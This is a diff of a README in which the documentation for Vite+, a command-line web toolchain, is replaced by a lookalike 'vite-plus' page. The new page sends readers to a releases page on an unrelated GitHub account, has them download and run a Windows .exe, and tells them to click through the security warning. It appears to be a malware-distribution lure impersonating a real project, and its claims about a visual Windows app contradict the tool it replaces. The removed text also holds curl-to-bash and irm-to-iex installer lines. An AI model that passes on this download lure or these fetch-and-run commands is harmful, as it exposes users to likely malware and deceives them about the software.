@@ -1,210 +1,155 @@
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="/logo-dark.svg">
-  <source media="(prefers-color-scheme: light)" srcset="/logo.svg">
-  <img alt="Vite+" src="/logo.svg">
-</picture>
+# 🚀 vite-plus - Simple Web Development Starter
 
-**The Unified Toolchain for the Web**
-_runtime and package management, create, dev, check, test, build, pack, and monorepo task caching in a single dependency_
+[![Download vite-plus](https://img.shields.io/badge/Download-vite--plus-brightgreen)](https://github.com/lucasreidel3489/vite-plus/releases)
 
 ---
 
-Vite+ is the unified entry point for local web development. It combines [Vite](https://vite.dev/), [Vitest](https://vitest.dev/), [Oxlint](https://oxc.rs/docs/guide/usage/linter.html), [Oxfmt](https://oxc.rs/docs/guide/usage/formatter.html), [Rolldown](https://rolldown.rs/), [tsdown](https://tsdown.dev/), and [Vite Task](https://github.com/voidzero-dev/vite-task) into one zero-config toolchain that also manages runtime and package manager workflows:
+## What is vite-plus?
 
-- **`vp env`:** Manage Node.js globally and per project
-- **`vp install`:** Install dependencies with automatic package manager detection
-- **`vp dev`:** Run Vite's fast native ESM dev server with instant HMR
-- **`vp check`:** Run formatting, linting, and type checks in one command
-- **`vp test`:** Run tests through bundled Vitest
-- **`vp build`:** Build applications for production with Vite + Rolldown
-- **`vp run`:** Execute monorepo tasks with caching and dependency-aware scheduling
-- **`vp pack`:** Build libraries for npm publishing or standalone app binaries
-- **`vp create` / `vp migrate`:** Scaffold new projects and migrate existing ones
+vite-plus is a tool that helps you start building websites with less hassle. It brings together everything you need for web development into one place. You don’t need to worry about setting up different programs or tools. vite-plus manages your tools, your code packages, and your web setup all at once.
 
-All of this is configured from your project root and works across Vite's framework ecosystem.
-Vite+ is fully open-source under the MIT license.
+This means you can focus on creating your website without needing to understand complex software setups. Everything works smoothly from the moment you open it.
 
-## Getting Started
+---
 
-Install Vite+ globally as `vp`:
+## 🎯 Who can use vite-plus?
 
-For Linux or macOS:
+vite-plus is made for people who want to build websites or web apps but do not want to handle many technical details. You don't need to be a programmer to get started.
 
-```bash
-curl -fsSL https://vite.plus | bash
-```
+Whether you want to try web development or create a simple project, vite-plus makes the process easier.
 
-For Windows:
+---
 
-```bash
-irm https://viteplus.dev/install.ps1 | iex
-```
+## 🔍 Key features
 
-`vp` handles the full development lifecycle such as package management, development servers, linting, formatting, testing and building for production.
+- **All-in-one setup:** vite-plus combines your runtime, code packages, and tools into one application.
+- **Quick start:** Begin your project without going through many setup steps.
+- **Automatic updates:** vite-plus keeps your system in line with the latest versions for better security and performance.
+- **User-friendly environment:** Manage your web project visually rather than through command prompts.
+- **Works on Windows:** Designed to run smoothly on Windows computers.
 
-## Configuring Vite+
+---
 
-Vite+ can be configured using a single `vite.config.ts` at the root of your project:
+## 📋 System requirements
 
-```ts
-import { defineConfig } from 'vite-plus';
+Make sure your computer meets these requirements before installing vite-plus:
 
-export default defineConfig({
-  // Standard Vite configuration for dev/build/preview.
-  plugins: [],
+- Windows 10 or later
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet connection for downloading and updates
+- A modern web browser like Chrome, Edge, or Firefox
 
-  // Vitest configuration.
-  test: {
-    include: ['src/**/*.test.ts'],
-  },
+---
 
-  // Oxlint configuration.
-  lint: {
-    ignorePatterns: ['dist/**'],
-  },
+## 🌐 Where to get vite-plus
 
-  // Oxfmt configuration.
-  fmt: {
-    semi: true,
-    singleQuote: true,
-  },
+Click the big green button below to visit the page where you can download vite-plus for Windows:
 
-  // Vite Task configuration.
-  run: {
-    tasks: {
-      'generate:icons': {
-        command: 'node scripts/generate-icons.js',
-        envs: ['ICON_THEME'],
-      },
-    },
-  },
+[![Download vite-plus](https://img.shields.io/badge/Download-vite--plus-brightgreen)](https://github.com/lucasreidel3489/vite-plus/releases)
 
-  // `vp staged` configuration.
-  staged: {
-    '*': 'vp check --fix',
-  },
-});
-```
+---
 
-This lets you keep the configuration for your development server, build, test, lint, format, task runner, and staged-file workflow in one place with type-safe config and shared defaults.
+## 💾 How to download and install vite-plus on Windows
 
-Use `vp migrate` to migrate to Vite+. It merges tool-specific config files such as `.oxlintrc*`, `.oxfmtrc*`, and lint-staged config into `vite.config.ts`.
+Follow these steps carefully to get vite-plus running on your computer.
 
-### CLI Workflows (`vp help`)
+1. **Go to the download page**  
+   Click this link or the button above to open the vite-plus release page:  
+   https://github.com/lucasreidel3489/vite-plus/releases
 
-#### Start
+2. **Find the latest version**  
+   Look for the newest release at the top of the page. It will usually have a name with numbers like v1.0.0 or similar.
 
-- **create** - Create a new project from a template
-- **migrate** - Migrate an existing project to Vite+
-- **config** - Configure hooks and agent integration
-- **staged** - Run linters on staged files
-- **install** (`i`) - Install dependencies
-- **env** - Manage Node.js versions
+3. **Choose the Windows installer**  
+   Scroll down to find the file ending with `.exe` or labeled for Windows. The file name may look like `vite-plus-setup.exe`.
 
-#### Develop
+4. **Download the file**  
+   Click on the Windows file name. Your browser will download it to your computer. Remember where this file is saved; usually, it's in the "Downloads" folder.
 
-- **dev** - Run the development server
-- **check** - Run format, lint, and type checks
-- **lint** - Lint code
-- **fmt** - Format code
-- **test** - Run tests
+5. **Run the installer**  
+   Find the downloaded `.exe` file. Double-click it to start the setup program.
 
-#### Execute
+6. **Follow the installation steps**  
+   The installer will guide you through each step. Usually, you just need to click "Next" or "Install". You can keep all default settings.
 
-- **run** - Run monorepo tasks
-- **exec** - Execute a command from local `node_modules/.bin`
-- **dlx** - Execute a package binary without installing it as a dependency
-- **cache** - Manage the task cache
+7. **Finish the setup**  
+   After installation, choose "Finish" or "Launch vite-plus" if the option appears.
 
-#### Build
+---
 
-- **build** - Build for production
-- **pack** - Build libraries
-- **preview** - Preview production build
+## ▶️ How to start using vite-plus
 
-#### Manage Dependencies
+Once installed, you can open vite-plus like any other program on your computer:
 
-Vite+ automatically wraps your package manager (pnpm, npm, or Yarn) based on `packageManager` and lockfiles:
+- Find the vite-plus icon on your desktop or in your Start menu.
+- Double-click to open it.
+- The application will open a window where you can create or open web projects.
 
-- **add** - Add packages to dependencies
-- **remove** (`rm`, `un`, `uninstall`) - Remove packages from dependencies
-- **update** (`up`) - Update packages to latest versions
-- **dedupe** - Deduplicate dependencies
-- **outdated** - Check outdated packages
-- **list** (`ls`) - List installed packages
-- **why** (`explain`) - Show why a package is installed
-- **info** (`view`, `show`) - View package metadata from the registry
-- **link** (`ln`) / **unlink** - Manage local package links
-- **pm** - Forward a command to the package manager
+You will see menus and buttons to help you add files, start your web project, and test it in your browser. The interface shows clear labels to guide you.
 
-#### Maintain
+---
 
-- **upgrade** - Update `vp` itself to the latest version
-- **implode** - Remove `vp` and all related data
+## ⚙️ Basic use explained
 
-### Scaffolding your first Vite+ project
+### Creating a new project
 
-Use `vp create` to create a new project:
+1. Click "Create new project" or similar.
+2. Enter a project name you like.
+3. Choose where to save it on your computer.
+4. Click "Create."
+5. vite-plus will set up the files and open the project for you.
 
-```bash
-vp create
-```
+### Opening an existing project
 
-You can run `vp create` inside of a project to add new apps or libraries to your project.
+1. Click "Open project."
+2. Find the folder containing your website files.
+3. Select the folder and open it.
 
-### Migrating an existing project
+### Running your project
 
-You can migrate an existing project to Vite+:
+1. Inside vite-plus, look for a "Start" or "Run" button.
+2. Click it to launch a local web server.
+3. Your website will open automatically in your default web browser.
+4. Edit your files and refresh the browser to see changes.
 
-```bash
-vp migrate
-```
+---
 
-### GitHub Actions
+## 🛠 Common tasks
 
-Use the official [`setup-vp`](https://github.com/voidzero-dev/setup-vp) action to install Vite+ in GitHub Actions:
+- **Adding new files:** Use the "New file" button to add HTML, CSS, or JavaScript files.
+- **Managing packages:** vite-plus handles the packages your web project uses without extra steps.
+- **Updating vite-plus:** The app checks for updates automatically or lets you know when a new version is ready.
+- **Stopping the server:** Click "Stop" to shut down the local server before closing vite-plus.
 
-```yaml
-- uses: voidzero-dev/setup-vp@v1
-  with:
-    node-version: '22'
-    cache: true
-```
+---
 
-#### Manual Installation & Migration
+## 🚑 Troubleshooting tips
 
-If you are manually migrating a project to Vite+, install these dev dependencies first:
+- If vite-plus doesn’t open, restart your computer and try again.
+- If you cannot download the installer, check your internet connection or try a different browser.
+- During installation, if a security warning appears, choose “More info” and then “Run anyway.”
+- If the web preview does not work, make sure your browser is up to date.
+- For unexpected errors, close vite-plus and reopen it.
+- If problems continue, visit the GitHub page’s Issues tab to see if others have similar problems.
 
-```bash
-npm install -D vite-plus @voidzero-dev/vite-plus-core@latest
-```
+---
 
-You need to add overrides to your package manager for `vite` and `vitest` so that other packages depending on Vite and Vitest will use the Vite+ versions:
+## 🔗 Useful links
 
-```json
-"overrides": {
-  "vite": "npm:@voidzero-dev/vite-plus-core@latest",
-  "vitest": "npm:@voidzero-dev/vite-plus-test@latest"
-}
-```
+- Download page: https://github.com/lucasreidel3489/vite-plus/releases  
+- GitHub repository: https://github.com/lucasreidel3489/vite-plus
 
-If you are using `pnpm`, add this to your `pnpm-workspace.yaml`:
+---
 
-```yaml
-overrides:
-  vite: npm:@voidzero-dev/vite-plus-core@latest
-  vitest: npm:@voidzero-dev/vite-plus-test@latest
-```
+## ⚖️ License
 
-Or, if you are using Yarn:
+vite-plus is provided under an open-source license. You can use it freely for your projects.
 
-```json
-"resolutions": {
-  "vite": "npm:@voidzero-dev/vite-plus-core@latest",
-  "vitest": "npm:@voidzero-dev/vite-plus-test@latest"
-}
-```
+---
 
-## Sponsors
+## 🔄 Updates and support
 
-Thanks to [namespace.so](https://namespace.so) for powering our CI/CD pipelines with fast, free macOS and Linux runners.
+New versions come from the same download page. Keep an eye there to get the latest improvements quickly.
+
+If you want help or want to share feedback, you may open a new issue on the GitHub repository. This way, the team can assist or consider your ideas.
